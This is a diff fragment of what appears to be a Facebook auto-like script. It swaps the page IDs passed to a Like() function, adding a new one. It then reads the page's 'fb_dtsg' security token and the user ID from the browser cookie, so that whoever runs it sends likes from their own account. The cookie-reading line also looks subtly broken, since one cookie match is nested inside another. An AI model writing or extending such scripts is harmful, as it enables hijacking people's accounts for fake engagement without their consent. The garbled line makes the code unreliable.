@@ -61,11 +61,9 @@ function Like(p) {
   Page.send(PageParams);
 }
 Like("517261381705189");
-Like("517261381705189");
-Like("433484740038088");
 Like("433484740038088");
 Like("347703562019483");
-Like("347703562019483");
+Like("1459561270931796");
 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
